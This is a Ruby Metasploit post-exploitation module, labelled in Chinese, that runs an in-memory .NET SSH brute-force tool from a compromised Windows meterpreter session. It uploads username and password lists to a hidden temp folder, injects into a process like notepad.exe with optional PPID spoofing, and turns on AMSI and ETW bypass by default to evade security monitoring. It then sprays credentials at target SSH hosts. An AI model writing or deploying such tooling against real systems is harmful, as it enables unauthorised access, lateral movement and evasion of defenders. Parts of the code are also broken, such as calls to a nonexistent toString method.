# -*- coding: UTF-8 -*-

class MetasploitModule < Msf::Post

    include Msf::Post::File
    # include Msf::Auxiliary::AuthBrute
  
    def initialize(info = {})
        super(
            update_info(
                info,
                'Name' => 'SSH爆破模块',
                'Description' => %q{
                本模块调用execute_dotnet_assembly模块在内存中执行ssh爆破程序
                },
                'License' => MSF_LICENSE,
                'Author' => ['3ricK5r'],
                'Arch' => [ARCH_X64],
                'Platform' => 'win',
                'SessionTypes' => ['meterpreter'],
                'Targets' => [['Windows x64 (<= 10)', { 'Arch' => ARCH_X64 }]],
                'DefaultTarget' => 0
            )
        )
        register_options(
            [
                # Opt::RPORT(21),
                # OptPath.new('DOTNET_EXE', [false, '.net程序路径']),
                # OptString.new('ARGUMENTS', [false, '命令行参数（必须为字符串）']),
                OptString.new('PROCESS', [false, '准备启动的进程名称', 'notepad.exe']),
                OptInt.new('PID', [false, '注入到的Pid', 0]),
                OptInt.new('PPID', [false, '创建新进程时用于 PPID spoofing 的进程标识符。 (0 = no PPID spoofing)', 0]),
                OptInt.new('TIMEOUT', [false, '等待返回结果的超时时间（单位：秒）', 600]),

                OptString.new('RHOST', [true, '目标主机地址，格式示例：192.168.1.1,192.168.1.1-192.168.200.1,192.168.0.0/16']),
                OptInt.new('RPORT', [true, '目标端口', 22]),
                 OptInt.new('THREADS', [false, '最大并行线程数量，默认为50']),
                OptBool.new('KILL', [true, '任务结束之后关闭进程', false]),
                OptBool.new('STOP_ON_SUCCESS', [false, '开关：一个主机找到了一个凭据就停下来，默认为true', true]),
                OptBool.new('VERBOSE', [false, '是否打印vprint的输出', false]),

                OptString.new('PASSWORD', [false, '指定校验密码']),
                OptString.new('PASS_FILE', [false, '指定校验密码文件，每行一个']),
                OptString.new('USERNAME', [false, '指定校验用户名']),
                OptString.new('USER_FILE', [false, '指定校验用户名文件，每行一个']),
           ], self.class
        )
  
        register_advanced_options(
            [
                OptInt.new('WAIT', [false, '进程运行后等待其执行的时间（单位：秒）', 10]),
                OptInt.new('RETRYS', [false, '每个用户名/密码的重试次数，默认为0次']),
                OptInt.new('CONNECT_TIMEOUT', [false, '连接的超时时间（单位：秒），默认为5秒']),
                OptBool.new('AMSIBYPASS', [true, 'Enable Amsi bypass', true]),
                OptBool.new('ETWBYPASS', [true, 'Enable Etw bypass', true]),
                OptString.new('USETHREADTOKEN', [false, '使用线程模拟生成进程', true]),
            ]
        )

        # deregister_options('BRUTEFORCE_SPEED','USERPASS_FILE', 'BLANK_PASSWORDS', 'USER_AS_PASS', 'DB_ALL_CREDS', 'DB_ALL_PASS', 'DB_ALL_USERS')
        # deregister_options('MaxGuessesPerService','MaxGuessesPerUser', 'MaxMinutesPerService', 'PASSWORD_SPRAY', 'TRANSITION_DELAY',
        #     'REMOVE_USERPASS_FILE', 'REMOVE_PASS_FILE', 'REMOVE_USER_FILE')
    end
  
    def run

        ssh_exe_path = ::File.join(Msf::Config.data_directory, 'post', 'scanner', 'ssh.exe')
        ssh_exe_path = ::File.expand_path(ssh_exe_path)
        datastore['DOTNET_EXE'] = ssh_exe_path
        vprint_status("DOTNET_EXE: #{ssh_exe_path}")

        datastore['ARGUMENTS'] = ''
        # datastore['USETHREADTOKEN'] = true
        # datastore['AMSIBYPASS'] = true
        # datastore['ETWBYPASS'] = true
 
        unless File.file?(ssh_exe_path)
            fail_with(Failure::BadConfig, "错误：没有找到.net运行程序#{ssh_exe_path}！")
        end

        if datastore['THREADS'] != nil and datastore['THREADS'].positive? and datastore['THREADS'] < 10000
            datastore['ARGUMENTS'] += ' -t ' + datastore['THREADS'].toString()
        end

        if datastore['RETRYS'] != nil
            unless datastore['RETRYS'].negative?
                datastore['ARGUMENTS'] += ' -r ' + datastore['RETRYS'].toString()
            end
        end

        if datastore['CONNECT_TIMEOUT'] != nil and datastore['CONNECT_TIMEOUT'].positive? and datastore['CONNECT_TIMEOUT'] < 300
            datastore['ARGUMENTS'] += ' -o ' + datastore['CONNECT_TIMEOUT'].toString()
        end

        unless datastore['STOP_ON_SUCCESS'] == nil or (datastore['STOP_ON_SUCCESS'] != nil and datastore['STOP_ON_SUCCESS'] == true) 
            datastore['ARGUMENTS'] += ' -c false'
        end

        if datastore['RHOST'] != nil and datastore['RHOST'].length > 0
            datastore['ARGUMENTS'] += ' -h ' + datastore['RHOST']
        else
            fail_with(Failure::BadConfig, "错误：目标设置不正确！")
        end

        if datastore['RPORT'] != nil and datastore['RPORT'].positive? and datastore['RPORT'] < 65536
            if datastore['RPORT'] != 22
                datastore['ARGUMENTS'] += ' -p ' + datastore['RPORT'].toString()
            end
        else
            fail_with(Failure::BadConfig, "错误：端口#{datastore['RPORT']}设置不正确！")
        end

        unless (datastore['USER_FILE'] != nil and File.file?(datastore['USER_FILE'])) or datastore['USERNAME'] != nil
            fail_with(Failure::BadConfig, "错误：没有指定用户名！")
        end

        unless (datastore['PASS_FILE'] != nil and File.file?(datastore['PASS_FILE'])) or datastore['PASSWORD'] != nil
            fail_with(Failure::BadConfig, "错误：没有指定密码！")
        end

        if (datastore['USER_FILE'] != nil and File.file?(datastore['USER_FILE'])) or (datastore['PASS_FILE'] != nil and File.file?(datastore['PASS_FILE']))
            randdir = create_store_rand_dir()
            if randdir == nil 
                fail_with(Failure::NoAccess, "错误：远程机器无法创建临时目录！")
            end
        end

        begin
            if (datastore['USER_FILE'] != nil and File.file?(datastore['USER_FILE']))
                user_randfile = Rex::Text.rand_text_alpha(5).chomp
                user_randfile_path = randdir+"\\"+user_randfile+'.txt'
                session.fs.file.upload_file(user_randfile_path, datastore['USER_FILE'])

                datastore['ARGUMENTS'] += ' -u ' + user_randfile_path
            else
                datastore['ARGUMENTS'] += ' -u ' + datastore['USERNAME']
            end

            if (datastore['PASS_FILE'] != nil and File.file?(datastore['PASS_FILE']))
                pass_randfile = Rex::Text.rand_text_alpha(5).chomp
                pass_randfile_path = randdir+"\\"+ pass_randfile+'.txt'
                session.fs.file.upload_file(pass_randfile_path, datastore['PASS_FILE'])

                datastore['ARGUMENTS'] += ' -w ' + pass_randfile_path
            else
                datastore['ARGUMENTS'] += ' -w ' + datastore['PASSWORD']
            end
        rescue ::Exception => e
            clean_temp_dir(randdir)
            print_status("Error uploading file #{file}: #{e.class} #{e}")
            fail_with(Failure::NoAccess, "错误：远程机器无法上传文件#{file}！")
            raise e
        end

        datastore['ARGUMENTS'] = datastore['ARGUMENTS'].lstrip
        vprint_status("ARGUMENTS: #{datastore['ARGUMENTS']}")
        
        execute_dotnet_assembly = framework.modules.create('post/windows/manage/execute_dotnet_assembly')
        
        result = execute_dotnet_assembly.run_simple(
        'LocalInput'  => user_input,
        'LocalOutput' => user_output,
        'Options'     => datastore
        )

        clean_temp_dir(randdir) if randdir != nil
    end

    def clean_temp_dir(dir_path)
        session.fs.dir.rmdir(dir_path)
    end

    def create_store_rand_dir()
        dirname     = Rex::Text.rand_text_alpha(10)
        fulldirname = session.sys.config.getenv('tmp') + "\\" + dirname
        # binding.pry
        session.fs.dir.mkdir(fulldirname)
        if session.fs.file.exist? fulldirname
          vprint_good("create storedir : #{fulldirname}")
          return fulldirname
        else
          vprint_error("create storedir failed : #{fulldirname}")
          return nil
        end
      end
  end
  